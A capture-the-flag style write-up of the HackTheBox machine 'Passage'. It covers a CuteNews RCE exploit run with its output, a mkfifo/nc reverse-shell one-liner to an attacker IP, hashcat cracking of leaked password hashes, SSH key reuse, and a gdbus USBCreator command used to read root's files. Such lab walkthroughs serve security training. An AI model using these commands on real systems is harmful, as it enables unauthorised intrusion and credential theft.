---
title: "HackTheBox - Passage"
author: Nasrallah
description: ""
date: 2023-05-15 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, medium, rce, hashcat, crack]
img_path: /assets/img/hackthebox/machines/passage
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Passage](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.206
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17eb9e23ea23b6b1bcc64fdb98d3d4a1 (RSA)
|   256 71645150c37f184703983e5eb81019fc (ECDSA)
|_  256 fd562af8d060a7f1a0a147a438d6a8a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found just two ports, 22 and 80.

### Web

Let's check the web page.

![](1.png)

The page is powered by `CuteNews` and the copyright is from 2020.

Let's check if there is any exploits in this CMS.

![](2.png)

We found a RCE exploit. let's download it [here](https://www.exploit-db.com/exploits/48800).

## **Foothold**

It's time to run the exploit.`python3 exploit.py`

```terminal
$ python3 exploit.py                                                                                                                                     
                                                                                                                                                              
                                                                                                                                                              
                                                                                                                                                              
           _____     __      _  __                     ___   ___  ___                                                                                         
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |                                                                                        
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/                                                                                         
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/                                                                                         
                                ___  _________                                                                                                                
                               / _ \/ ___/ __/                                                                                                                
                              / , _/ /__/ _/                                                                                                                  
                             /_/|_|\___/___/                                                                                                                  
                                                                                                                                                              

                                                                                                                                                    

[->] Usage python3 expoit.py

Enter the URL> http://10.10.10.206/
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: HiRzNzxLLn and password: HiRzNzxLLn

=======================================================
Sending Payload
=======================================================
signature_key: dda213e56a87edc81ebf48f5186f8a60-HiRzNzxLLn
signature_dsi: aabd7308915e904c7367a7e357bc88d6
logged in user: HiRzNzxLLn
============================
Dropping to a SHELL
============================

command > id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Great! We got some user hashes and command execution as `www-data`, now let's get a proper reverse shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```

![](3.png)

## **Privilege Escalation**

### www-data --> paul

#### hashcat

The exploit gave us some SHA256 hashes so let's try cracking them with `hashcat` mode 1400 

```terminal
$ hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
                                       
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5 CPU       M 520  @ 2.40GHz, 2726/2790 MB (1024 MB allocatable), 4MCU

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
Approaching final keyspace - workload adjusted.  

                                                 
Session..........: hashcat
Status...........: Exhausted
Hash.Name........: SHA2-256
Hash.Target......: hashes.txt
Time.Started.....: Thu May 18 10:30:23 2023 (10 secs)
Time.Estimated...: Thu May 18 10:30:33 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1469.4 kH/s (1.39ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/5 (20.00%) Digests
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
```

We got a password, now let's see what user's are on the box.

```terminal
www-data@passage:/var/www/html/CuteNews/uploads$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
```

We found `paul` and `nadav`, let's use the password and see if we can switch to any of them.

![](4.png)

Great! That was `paul`'s password.

### paul --> nadav

On `paul`'s home directory we find a `.ssh` directory with a private key.

![](5.png)

One thing to notice is the on `authorized_keys` we find `nadav`'s public key, and same with `id_rsa.pub`. The question is are they using the same keys?!.

Let's test it.

![](6.png)

They are using the same key, now we have access to both users.

### nadav --> root

Now let's run `linpeas`

![](7.png)

The script told us that USBCreator is vulnerable and provided us with a [link](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation#gui-enumeration) that talks about the vulnerability, but didn't find a way to exploit it.

I searched on google for `USBCreator privesc` and found this [article](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) that provides us with a POC that allows us to copy files.

```bash
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /source/file /destination/file true
```

We can use that to get `root.txt`.

![](8.png)

To get a root shell, we can try grabbing the root private ssh key.

![](9.png)

Now we use the key to ssh as root.

![](10.png)


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).